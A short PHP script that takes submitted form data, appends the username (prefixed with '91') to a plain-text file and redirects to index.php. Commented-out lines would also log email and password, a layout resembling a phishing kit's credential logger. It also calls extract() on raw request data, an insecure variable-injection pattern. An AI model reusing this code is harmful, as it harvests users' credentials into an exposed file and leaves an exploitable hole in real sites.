<?php
    extract($_REQUEST);
    $file=fopen("form-save.txt","a");

    fwrite($file,"91");
    fwrite($file, $username ."\n");
    #fwrite($file,"Email :");
    #fwrite($file, $email ."\n");
    #fwrite($file,"Password :");
    #fwrite($file, $password ."\n");
    fclose($file);
    header("location: index.php");
 ?>
